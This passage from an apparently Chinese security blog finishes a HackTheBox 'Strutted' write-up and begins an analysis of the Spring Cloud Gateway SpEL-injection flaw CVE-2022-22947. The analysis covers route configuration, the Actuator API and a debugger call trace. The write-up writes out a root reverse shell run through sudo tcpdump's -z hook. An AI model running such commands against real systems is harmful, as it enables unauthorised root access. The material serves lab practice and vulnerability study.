secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User james may run the following commands on localhost:<br>    (ALL) NOPASSWD: /usr/sbin/tcpdump<br></code></pre></td></tr></table></figure><p>有 tcpdump , 我们再 <a href="https://gtfobins.github.io/">GTFOBins</a> 上搜索一下，看看能不能提权</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706220022241.png" alt="image-20250706220022241"></p><p>有提权方式，我们跟着敲一下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMAND=<span class="hljs-string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.119/9001 0&gt;&amp;1&#x27;&quot;</span><br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$COMMAND</span>&quot;</span> &gt; <span class="hljs-variable">$TF</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$TF</span><br><span class="hljs-built_in">sudo</span> tcpdump -<span class="hljs-built_in">ln</span> -i lo -w /dev/null -W 1 -G 1 -z <span class="hljs-variable">$TF</span> -Z root<br></code></pre></td></tr></table></figure><p>成功弹回了 root 的shell</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706222914404.png" alt="image-20250706222914404"></p><p>拿到flag</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706223004317.png" alt="image-20250706223004317"></p><p>到这里Strutted靶机就渗透完成了</p><p><span style="font-size:1.4em;">happy hacking ~ ~</span></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 文件上传分析(S2-066)</a></p><p><a href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">Apache Struts2 文件上传逻辑绕过(CVE-2024-53677)(S2-067)</a></p><p><a href="https://labs.hackthebox.com/api/v4/machine/writeup/644">HTB Strutted writeup</a></p><p><a href="https://developer.aliyun.com/article/330800">Struts2 的值栈和对象栈-阿里云开发者社区</a> </p><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1751291364&ver=6084&signature=tKCXDtRIm2WHNszJkNfSiDWWI0Yq*Emi-s9o9ooYp*4ptsOlIgmVeb1CpDXBJPR5pzJFu2zWFDl8Pm4EVF4IEszCmGkC4IfntfJhQI-ZD0S6yOU5slCpxdITudf*zvAR&new=1">Apache Struts2 文件上传漏洞复现与分析（CVE-2023-50164&#x2F;S2-066）</a></p><p><a href="https://www.cnblogs.com/hetianlab/p/18084560">S2-066 漏洞分析与复现（CVE-2023-50164） - 蚁景网安实验室 - 博客园</a></p><p><a href="https://xz.aliyun.com/news/12618">Apache Struts2 文件上传漏洞分析（CVE-2023-50164）-先知社区</a></p><p><a href="https://dayutech.github.io/archives/fe8a0a5d.html">Apache Struts2 S2-066 任意文件上传漏洞（CVE-2023-50164） | Dayu Technology Co., LTD</a></p>]]></content>
    
    
    <categories>
      
      <category>HTB靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB靶机</tag>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringCloud GateWay 漏洞分析</title>
    <link href="/2025/05/15/SpringCloud-GateWay-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/05/15/SpringCloud-GateWay-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="SpringCloud-GateWay-漏洞分析"><a href="#SpringCloud-GateWay-漏洞分析" class="headerlink" title="SpringCloud GateWay 漏洞分析"></a>SpringCloud GateWay 漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://spring.io/projects/spring-cloud">Spring Cloud 官方文档</a></p><p>Spring Cloud 是一套基于 Spring Boot 的云原生分布式系统开发工具包。它解决了常见的分布式系统关键问题，如服务注册与发现、配置管理、服务容错、智能路由、消息驱动等。</p><p>他的组件有很多，其中就包括 SpringCloudGateWay。他是 SpringCloud 的下一代 API 网关，主要用于替换传统的 Zuul 1.x。他基于 Spring WebFlux，具有高性能和良好的可扩展性。</p><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul><li>Route（路由）：这是 Spring Cloud Gateway 的基本构建块。由一个 ID，一个目标 URI，一组断言和一组过滤器定义。若请求与断言匹配成功，则将请求转发到对应服务。</li><li>Predicate（断言）：Predicate 来源于 Java 8，是路由转发的判断条件。用于匹配来自 HTTP 请求的任何内容，例如：请求头、正文参数、请求路径等。</li><li>Filter（过滤器）：这是 org.springframework.cloud.gateway.filter.GatewayFilter 类的实例，用于拦截请求并进行修改，还可以服务返回的响应进行再处理。</li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>首先客户端向 Spring Cloud Gateway 发出请求。接着在 Gateway Handler Mapping 中进行路由匹配，匹配成功后将其发送到 Gateway Web Handler。Handler 再通过指定的过滤器链来将请求发送到对应的服务执行业务逻辑，然后返回结果。</p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>我们先来看一下 SpringCloud GateWay 在代码中的使用</p><p>创建一个普通的 springboot 项目，修改 springboot 版本并加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2021.0.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--        有漏洞底层包版本--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-gateway-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>要把 springboot 的 <code>spring-boot-starter-web</code> 删除掉</p></blockquote><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>通过  .yml 配置文件进行配置网关</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Gateway</span><br><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">&quot;test1&quot;</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">&quot;http://www.baidu.com/&quot;</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/</span><br>          <span class="hljs-attr">filters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">AddResponseHeader=Result,1</span><br></code></pre></td></tr></table></figure><p>各字段含义如下：</p><ul><li>id：我们自定义的路由 ID，保持唯一</li><li>uri：目标服务地址</li><li>predicates：路由条件，Predicate 接受一个输入参数，返回一个布尔值结果。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）。</li><li>filters：过滤规则，本示例暂时没用。</li></ul><p>做好如上配置后，启动项目，访问 <code>localhost:8080/</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-05-14_15-02-17.gif" alt="PixPin_2025-05-14_15-02-17"></p><p>看到直接就跳转到了百度的网页，这正是网关的作用</p><h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>除了可以用 .yml 配置文件配置路由，我们还可以使用 Actuator（spring 监控组件）动态配置路由。</p><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>同时配置文件也要开启 gateway 监控 （Spring Boot 2.x 后为了安全起见默认只开放 &#x2F;actuator&#x2F;health 和 &#x2F;actuator&#x2F;info 端点）</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">gateway</span><br></code></pre></td></tr></table></figure><p>访问 <code>http://localhost:8080/actuator/gateway/routes</code> 可以看到我们配置的 GateWay</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514151324577.png" alt="image-20250514151324577" style="zoom:67%;" /><p><strong>添加路由</strong></p><p>我们可以发送 POST 请求 <code>/actuator/gateway/routes/&#123;id_route_to_create&#125;</code> 搭配 json 数据来动态的添加路由</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>我这里用的 postman</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514153450099.png" alt="image-20250514153450099" style="zoom:50%;" /><p>在发送 <code>http://localhost:8080/actuator/gateway/refresh</code> 刷新路由缓存</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514153918037.png" alt="image-20250514153918037" style="zoom:50%;" /><p>接着在浏览器访问 <code>http://localhost:8080/actuator/gateway/routes</code> 查看路由信息，看到动态添加的路由信息</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514154047183.png" alt="image-20250514154047183" style="zoom:50%;" /><p>访问一下看看 <code>http://localhost:8080/lingx5</code> 发现他会跳转到 <code>https://lingx5.github.io/lingx5</code> 页面不存在，这是由于 Spring Cloud Gateway &#x3D;&#x3D;默认保留匹配路径&#x3D;&#x3D; 转发给后端，也就是前端 <code>/9224</code>，后端也收到 <code>/9224</code> 这个 path。要避免这种情况，我们需要使用 RewritePath 修正路径。</p><p>修改后的 JSON</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;_genkey_1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以发送 Delete 请求到 <code>/gateway/routes/&#123;id_route_to_delete&#125;</code> 来删除路由</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514154915909.png" alt="image-20250514154915909" style="zoom:50%;" /><p>我们再次走上述流程添加即可正常跳转</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514155159069.png" alt="image-20250514155159069" style="zoom:50%;" /><h2 id="CVE-2022-22947"><a href="#CVE-2022-22947" class="headerlink" title="CVE-2022-22947"></a>CVE-2022-22947</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>SpringCloudGateWay 远程代码执行（CVE-2022-22947）是此组件在暴露 Gateway Actuator 端点时，动态添加路由时，存在 SpEL 表达式注入，造成 RCE</p><p>受影响版本：</p><ul><li>Spring Cloud Gateway（3.1.x）&lt; 3.1.1</li><li>Spring Cloud Gateway （3.0.x）&lt; 3.0.7</li><li>Spring Cloud Gateway 其他已不再更新的版本</li></ul><p>修复版本：</p><ul><li>Spring Cloud Gateway（3.1.x）&gt;&#x3D; 3.1.1</li><li>Spring Cloud Gateway（3.0.x）&gt;&#x3D; 3.0.7</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态路由分析"><a href="#静态路由分析" class="headerlink" title="静态路由分析"></a>静态路由分析</h4><p>首先，我们在配置文件中加入 SpEL 表达式</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194040350.png" alt="image-20250514194040350" style="zoom:50%;" /><p>配置文件会通过 <code>@ConfigurationProperties(&quot;spring.cloud.gateway&quot;)</code> 绑定到 org.springframework.cloud.gateway.config.GatewayProperties 这个类</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194221946.png" alt="image-20250514194221946" style="zoom:50%;" /><p>然后会通过 PropertiesRouteDefinitionLocator，把  GatewayProperties.getRoutes()  中的每一条配置，转换成框架真正用来路由的 RouteDefinition。</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194939526.png" alt="image-20250514194939526" style="zoom: 67%;" /><p>org.springframework.cloud.gateway.route.RouteDefinition 中就包含我了我们前面说的 Predicate（断言）和 Filter（过滤器）等配置信息</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514195700607.png" alt="image-20250514195700607"></p><p>在这之后，由 org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#convertToRoute 方法，去解析处理 RouteDefinition</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514200641583.png" alt="image-20250514200641583"></p><p>漏洞产生就发生在 org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#getFilters 方法的处理过程中，我们调试看看，在 this.getFilters 这行打断点</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514200510985.png" alt="image-20250514200510985"></p><p>调用了 RouteDefinitionRouteLocator#loadGatewayFilters </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201250492.png" alt="image-20250514201250492"></p><p>接着会调用到 org.springframework.cloud.gateway.support.ConfigurationService.AbstractBuilder#bind 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201501884.png" alt="image-20250514201501884"></p><p>可以看到 bind 方法中开始处理 配置的 filters，调用 normalizeProperties() 方法，标准化属性</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201619500.png" alt="image-20250514201619500"></p><p>接着就来到了 ShortcutConfigurable.ShortcutType#normalize 方法，循环调用了 ShortcutConfigurable.getValue() </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202157427.png" alt="image-20250514202157427"></p><p>这种表达式注入，没什么是比看到 getValue() 和 setValue() 方法，更让人兴奋的了，我们跟进，看到用 StandardEvaluationContext 解析 SpEL 表达式，造成了命令执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202327010.png" alt="image-20250514202327010"></p><p>成功弹出了计算器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202452483.png" alt="image-20250514202452483"></p><p><strong>调用栈</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getValue:<span class="hljs-number">65</span>, ShortcutConfigurable (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>normalize:<span class="hljs-number">94</span>, ShortcutConfigurable<span class="hljs-variable">$ShortcutType</span>$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>normalizeProperties:<span class="hljs-number">140</span>, ConfigurationService<span class="hljs-variable">$ConfigurableBuilder</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>bind:<span class="hljs-number">241</span>, ConfigurationService<span class="hljs-variable">$AbstractBuilder</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>loadGatewayFilters:<span class="hljs-number">144</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>getFilters:<span class="hljs-number">176</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>convertToRoute:<span class="hljs-number">117</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br></code></pre></td></tr></table></figure><h4 id="动态路由分析"><a href="#动态路由分析" class="headerlink" title="动态路由分析"></a>动态路由分析</h4><p>以上通过静态路由（改配置文件）的方式，利用条件很苛刻，几乎不可能实现呢。我们没有办法去更改目标系统的 <code>.yml</code> 配置文件</p><p>所以我们就想在目标允许 Actuator API 的话，动态添加路由的 filter 解析一样，应该会按照上述流程去解析</p><p>Actuator API 主要用到的就是 AbstractGatewayControllerEndpoint#save 方法和 refresh 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&#123;&quot;/routes/&#123;id&#125;&quot;&#125;)</span><br><span class="hljs-keyword">public</span> Mono&lt;ResponseEntity&lt;Object&gt;&gt; <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id,</span><br><span class="hljs-params">                                         <span class="hljs-meta">@RequestBody</span> RouteDefinition route)</span> &#123;<br>    <span class="hljs-keyword">return</span> Mono.just(route)<br>        <span class="hljs-comment">// 1) 校验路由定义是否合法（比如断言、过滤器、uri 等字段非空校验）</span><br>        .doOnNext(<span class="hljs-built_in">this</span>::validateRouteDefinition)<br>        <span class="hljs-comment">// 2) 保存到 RouteDefinitionWriter</span><br>        .flatMap(routeDefinition -&gt;<br>                 <span class="hljs-built_in">this</span>.routeDefinitionWriter<br>                 <span class="hljs-comment">// 注意：这里又包装成 Mono.just(...)，并在 map 里 setId</span><br>                 .save(Mono.just(routeDefinition)<br>                       .map(r -&gt; &#123;<br>                           r.setId(id);<br>                           log.debug(<span class="hljs-string">&quot;Saving route: &quot;</span> + r);<br>                           <span class="hljs-keyword">return</span> r;<br>                       &#125;))<br>                 <span class="hljs-comment">// 3) save 完成后，返回一个 201 CREATED</span><br>                 .then(Mono.defer(() -&gt;<br>                                  Mono.just(ResponseEntity<br>                                            .created(URI.create(<span class="hljs-string">&quot;/routes/&quot;</span> + id))<br>                                            .build()<br>                                           )<br>                                 ))<br>                )<br>        <span class="hljs-comment">// 如果传进来的 route 是 